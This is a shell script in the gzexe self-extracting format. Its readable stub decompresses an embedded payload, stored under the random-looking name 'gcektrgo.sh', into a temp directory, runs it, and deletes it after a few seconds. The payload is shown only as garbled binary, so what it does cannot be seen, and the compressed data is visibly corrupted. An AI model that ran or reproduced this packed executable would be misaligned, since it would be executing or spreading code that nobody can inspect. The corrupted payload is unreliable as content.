#!/bin/sh
skip=49

tab='	'
nl='
'
IFS=" $tab$nl"

umask=`umask`
umask 77

gztmpdir=
trap 'res=$?
  test -n "$gztmpdir" && rm -fr "$gztmpdir"
  (exit $res); exit $res
' 0 1 2 3 5 10 13 15

case $TMPDIR in
  / | /*/) ;;
  /*) TMPDIR=$TMPDIR/;;
  *) TMPDIR=/tmp/;;
esac
if type mktemp >/dev/null 2>&1; then
  gztmpdir=`mktemp -d "${TMPDIR}gztmpXXXXXXXXX"`
else
  gztmpdir=${TMPDIR}gztmp$$; mkdir $gztmpdir
fi || { (exit 127); exit 127; }

gztmp=$gztmpdir/$0
case $0 in
-* | */*'
') mkdir -p "$gztmp" && rm -r "$gztmp";;
*/*) gztmp=$gztmpdir/`basename "$0"`;;
esac || { (exit 127); exit 127; }

case `printf 'X\n' | tail -n +1 2>/dev/null` in
X) tail_n=-n;;
*) tail_n=;;
esac
if tail $tail_n +$skip <"$0" | gzip -cd > "$gztmp"; then
  umask $umask
  chmod 700 "$gztmp"
  (sleep 5; rm -fr "$gztmpdir") 2>/dev/null &
  "$gztmp" ${1+"$@"}; res=$?
else
  printf >&2 '%s\n' "Cannot decompress $0"
  (exit 127); res=127
fi; exit $res
�0ǲgcektrgo.sh �UaS�@��_�L�!
��Ȅ)"Ef��XJǘ�$���El-���H�Ն�}�ݼ�v3��{ƍ{+�jyv��|��M�	�Z�f��a�::�U��E��\���V/�_A�j��[)VE�{�A>"ҿ�����m#���n�}q�B�z��6U�qW�������¥
��+���D��0�_�iԞ
 �)�g�_�C�u�uzXv(��|���>��P��F��\��5PSʓ�:Rx�5���ذe��9&84l���:�r9N!��S�c�V�SΨ�K*j;ٱo�/�=�[�r���)8�&L�=j�U�:j��ʲzV�c)�<�;�R`PeJ����+W�����"Fv��:Pğ>����K��J6Gp�<�-�&���e���w�	�,�-ИH���vD<���F�B`�X�D1ǚY�E"�^y���Wl�D�q�����lHkx�8�v���5�l�ds��k1��/WP8^�ޞ��GB*<��=F.G�pSq����p�{O�ɒ�'ܭ)��ʈ�����xͣ��Ǧ ~2�J+[I	|�d�M��ܬ�73�������8lPY���Q��΀ѣ*�C^����'������#�Ӭk��fV&V�-+�2�w���J+�a��� 6Ks��3M�A�����D��RS�F��/�I�aH��%���p��'~���t��D]ֺ  